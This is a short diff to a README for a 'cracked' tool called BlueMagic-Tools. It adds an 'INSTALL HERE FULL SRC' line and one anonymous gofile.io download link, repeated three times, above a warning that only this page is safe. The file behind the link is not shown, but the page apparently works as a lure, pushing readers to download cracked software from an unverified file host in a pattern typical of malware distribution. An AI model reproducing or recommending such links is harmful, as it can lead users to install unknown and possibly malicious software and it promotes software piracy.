@@ -1,4 +1,9 @@
 <h3 align="center">🟢 BlueMagic-Tools CR@CKED</h3>
+INSTALL HERE FULL SRC 
+https://gofile.io/d/9ahDYP
+https://gofile.io/d/9ahDYP
+https://gofile.io/d/9ahDYP
+
 
 # Warning❗
 > **DO NOT** Installing BlueMagic-Tools From Anyother Place Than This Page, Expect it be **Hacked/Scammed.**
